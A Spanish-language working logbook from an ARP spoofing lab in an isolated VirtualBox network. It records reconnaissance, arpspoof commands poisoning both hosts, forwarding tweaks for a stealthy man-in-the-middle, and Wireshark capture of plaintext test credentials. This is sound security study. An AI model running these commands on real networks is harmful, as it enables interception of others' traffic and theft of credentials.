# Bitácora — Laboratorio de ARP Spoofing
**Autor:** Raúl (@rauljvc8)
**Proyecto:** Laboratorio de ARP Spoofing — ataque, detección y mitigación
**Fecha de inicio:** 2026-10-23

> Archivo de trabajo interno. Aquí se registra cada paso, comando, salida y captura
> para luego armar el README bilingüe (EN/ES) y el PDF en español (ReportLab).

---

## Entorno del laboratorio

| Elemento | Valor |
|---|---|
| Virtualizador | VirtualBox (MAC con prefijo `08:00:27`) |
| Red del lab | Host-Only — "VirtualBox Host-Only Ethernet Adapter" |
| Segmento | `192.168.56.0/24` |
| Gateway / Host | `192.168.56.1` |
| DHCP | Habilitado (reparte IPs automáticamente) |
| Aislamiento | Sin acceso a internet ni a la red doméstica (cumple Fase 0 / ética) |

### Máquinas

| Rol | SO | IP | MAC |
|---|---|---|---|
| Atacante | Kali Linux | `192.168.56.102` | `08:00:27:63:b0:05` |
| Víctima | Debian Linux (`enp0s3`) | `192.168.56.103` | `08:00:27:D1:65:C7` |
| Host (PC real) | — | `192.168.56.101` | `0A:00:27:00:00:0E` (adaptador Host-Only del anfitrión) |

### Herramientas confirmadas en Kali
- `arpspoof` → `/usr/bin/arpspoof` (paquete dsniff)
- `ettercap` → `/usr/bin/ettercap`
- Plan: demostrar el ataque manual (`arpspoof`) y luego la versión automatizada (`ettercap`)

---

## Registro de capturas de pantalla

| # | Fase | Qué muestra | Dato clave |
|---|---|---|---|
| 01 | 1 | `ip addr` inicial (modo NAT) | eth0 = `10.0.2.4/24` → NAT, el ataque NO funcionaría aquí |
| 02 | 1 | `which arpspoof ettercap` | Herramientas confirmadas instaladas |
| 03 | 1 | VirtualBox → Host-Only Networks | Red creada: `192.168.56.1/24`, DHCP activado |
| 04 | 1 | Config del adaptador Host-Only | Dejado en "Configure Adapter Automatically" |
| 05 | 1 | `ip addr show` tras cambiar a Host-Only | eth0 = `192.168.56.102/24` → lab aislado OK |
| 06 | 3 | `sudo nmap -sn 192.168.56.0/24` | 4 hosts vivos: 2 VMs (`.100`, `.103`), host (`.101`), Kali (`.102`) |
| 07 | 3 | `ip route` en la víctima (Debian) | SIN gateway por defecto → red aislada; solo `192.168.56.0/24` |
| 08 | 3 | `ip neigh` en la víctima (ANTES del ataque) | **EVIDENCIA CLAVE:** `.101`→`0a:00:27:00:00:0e` (MAC real del host) |
| 09 | 4 | IP forwarding habilitado en Kali | `net.ipv4.ip_forward = 1` |
| 10 | 4 | `arpspoof` Terminal 1 (engaña a la víctima) | `.101 is-at 8:0:27:63:b0:5` en bucle |
| 11 | 4 | `arpspoof` Terminal 2 (engaña al host) | `.103 is-at 8:0:27:63:b0:5` en bucle |
| 12 | 4 | `ip neigh` víctima (DESPUÉS) — antes/después | **PRUEBA DEL ATAQUE:** `.101`→`08:00:27:63:b0:05` (MAC de Kali) `REACHABLE` |
| 13 | 5 | Wireshark `eth0` filtro `icmp && ip.addr==.103` | **PRUEBA DEL MITM:** echo request de la víctima llega a Kali (Eth dst = MAC de Kali) |
| 14 | 5 | `arp -a` en el host Windows (pendiente) | Confirma `.103`→MAC de Kali (host también envenenado) |
| 15 | 5 | Ajustes `sysctl` + `iptables` en Kali | rp_filter=0, send_redirects=0, FORWARD ACCEPT (MITM sigiloso) |
| 16 | 5 | Ping víctima tras el arreglo | `0% packet loss`, `ttl=127` (antes 128 → +1 salto = Kali) |
| 17 | 5 | Wireshark: request + reply con TTL duplicado | **PRUEBA FORENSE:** cada paquete aparece 2× con TTL −1 (64→63, 128→127) = reenvío |
| 18 | 5 | Servidor de login (PowerShell) corriendo en el host | `escuchando en http://0.0.0.0:8000/` (host sin Python → PowerShell HttpListener) |
| 19 | 5 | Wireshark: `POST /login` capturado (Frame 5587) | **CAPTURA ESTRELLA:** `username=admin&password=Secreto123` en texto plano; User-Agent revela Firefox/Linux de la víctima |

### Decisión de diseño (Fase 3)
La red Host-Only no entrega puerta de enlace (no hay internet), así que el ARP spoofing
se demostrará interceptando el tráfico **Víctima (`.103`) ↔ Host (`.101`)**, donde el host
(PC real de Raúl) actúa como "gateway/servidor" del laboratorio. Se envenena ARP en ambos
sentidos y Kali queda en medio.

> **Nota:** las imágenes PNG las guarda Raúl en su equipo (ver recordatorio abajo).
> Esta tabla mapea cada número de captura con su paso para insertarlas en orden en el PDF.

---

## Fases y progreso

- [x] **Fase 0 — Ética y alcance.** Red Host-Only aislada, equipo propio, sin salida a internet.
- [x] **Fase 1 — Montaje del laboratorio.** VirtualBox + red Host-Only + Kali atacante en `192.168.56.102`.
- [~] **Fase 2 — Entender ARP.** Explicado el protocolo y por qué el ataque funciona (diagrama MITM hecho).
- [ ] **Fase 3 — Reconocimiento.** `nmap -sn` para descubrir la víctima. *(en curso)*
- [x] **Fase 4 — Ejecución del ARP spoofing.** ¡ÉXITO! Caché ARP de la víctima envenenada: `.101`→MAC de Kali, estado `REACHABLE`.
- [x] **Fase 5 — Demostrar el MITM.** ICMP interceptado + credenciales HTTP en texto plano capturadas (`admin`/`Secreto123`).
- [ ] **Fase 5 — Demostrar el MITM.** Captura en Wireshark.
- [ ] **Fase 6 — Detección.** Wireshark, cambios en caché ARP, arpwatch.
- [ ] **Fase 7 — Mitigación.** Entradas ARP estáticas, DAI, port security.
- [ ] **Fase 8 — Documentar y publicar.** README EN/ES + PDF + post de LinkedIn.

---

## Comandos ejecutados (cronológico)

```bash
# Fase 1 — diagnóstico inicial de red (mostró NAT, había que cambiar a Host-Only)
ip addr show
ip route | grep default
ip neigh

# Fase 1 — confirmación de herramientas
which arpspoof ettercap bettercap
# -> /usr/bin/arpspoof  /usr/bin/ettercap  (bettercap no instalado, no se necesita)

# Fase 1 — verificación tras cambiar a Host-Only
ip addr show eth0   # -> 192.168.56.102/24  OK
ip neigh

# Fase 3 — descubrimiento de la víctima
sudo nmap -sn 192.168.56.0/24
# Resultado (4 hosts vivos):
#   192.168.56.100  08:00:27:EE:99:D5  (VM VirtualBox)        -> candidata a víctima
#   192.168.56.101  0A:00:27:00:00:0E  (host-only del anfitrión) -> PC real de Raúl
#   192.168.56.102  (self)              Kali                  -> atacante
#   192.168.56.103  08:00:27:D1:65:C7  (VM VirtualBox)        -> candidata a víctima
# Confirmado: víctima = 192.168.56.103 (Debian)

# Fase 3 — foto del "antes" de la tabla ARP (ejecutado EN LA VÍCTIMA)
ip route                       # -> sin default gateway (red aislada)
ping -c 3 192.168.56.101       # poblar caché ARP con el host
ping -c 3 192.168.56.102       # poblar caché ARP con Kali
ip neigh                       # tabla ARP limpia, con las MAC REALES (antes del ataque)
# Resultado ANTES del ataque:
#   192.168.56.101 -> 0a:00:27:00:00:0e  (host, MAC real)
#   192.168.56.102 -> 08:00:27:63:b0:05  (Kali, MAC real)

# ============================================================
# Fase 4 — EJECUCIÓN DEL ATAQUE (todo en KALI, interfaz eth0)
# ============================================================

# 1) Habilitar IP forwarding (para que la víctima NO pierda conexión = MITM sigiloso)
sudo sysctl -w net.ipv4.ip_forward=1
cat /proc/sys/net/ipv4/ip_forward     # debe mostrar 1

# 2) Terminal 1 — engañar a la VÍCTIMA: "el host .101 soy yo"
sudo arpspoof -i eth0 -t 192.168.56.103 192.168.56.101

# 3) Terminal 2 — engañar al HOST: "la víctima .103 soy yo"
sudo arpspoof -i eth0 -t 192.168.56.101 192.168.56.103

# 4) Verificar EN LA VÍCTIMA (captura del "después"):
#   ip neigh  ->  .101 ahora apunta a 08:00:27:63:b0:05 (MAC de Kali)  <-- ¡CONFIRMADO!
#   Estado REACHABLE = la víctima está usando la entrada envenenada.
```

> **RESULTADO FASE 4 — ATAQUE EXITOSO**
> La tabla ARP de la víctima cambió de `0a:00:27:00:00:0e` (host real) a
> `08:00:27:63:b0:05` (Kali). El MITM está activo en ambos sentidos.

```bash
# ============================================================
# Fase 5 — DEMOSTRAR EL MITM (Wireshark en Kali)
# ============================================================
sudo wireshark &                       # capturar en eth0
# Filtro de visualización:  icmp && ip.addr == 192.168.56.103

# En la VÍCTIMA:
ping -c 5 192.168.56.101
# -> Los echo request aparecen en Kali (Eth dst = MAC de Kali) = INTERCEPCIÓN PROBADA

# --- Captura de credenciales en texto plano ---
# Host sin Python -> servidor de login en PowerShell (servidor-login-vulnerable.ps1)
# escuchando en http://0.0.0.0:8000/
# Víctima entra a http://192.168.56.101:8000/ y envía admin / Secreto123
# OJO: el puerto es 8000, no 80 -> el filtro "http" no lo muestra. Usar:
#   tcp.port == 8000
# Luego: clic derecho en POST /login -> Follow -> HTTP Stream
#        o expandir "HTML Form URL Encoded" en el panel de detalle.
# RESULTADO: username=admin&password=Secreto123  (CAPTURADO)
```

> **HALLAZGO IMPORTANTE (Fase 5):** al inicio el ping dio 100% de pérdida
> ("no response found"). La intercepción funcionaba pero el reenvío no cerraba el
> circuito → MITM disruptivo (DoS), que delata al atacante. Lección: un MITM sigiloso
> requiere reenvío completo. Diferencia clave entre espiar en silencio y cortar la red.

```bash
# Arreglo del reenvío en KALI (para MITM sigiloso):
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv4.conf.all.rp_filter=0
sudo sysctl -w net.ipv4.conf.eth0.rp_filter=0
sudo sysctl -w net.ipv4.conf.all.send_redirects=0
sudo sysctl -w net.ipv4.conf.eth0.send_redirects=0
sudo iptables -P FORWARD ACCEPT
# Luego re-probar el ping desde la víctima -> debe dar 0% packet loss
```

> **RESULTADO FASE 5 — MITM SIGILOSO CONFIRMADO**
> Tras el arreglo: víctima con `0% packet loss`, conexión "normal" para ella,
> pero todo el tráfico pasa por Kali. Wireshark muestra cada paquete DUPLICADO
> con el TTL decrementado en 1 (64→63 en requests, 128→127 en replies) = prueba
> forense del reenvío. Además el TTL que ve la víctima bajó de 128 a 127 (señal
> de detección: aparece un salto extra en la ruta).
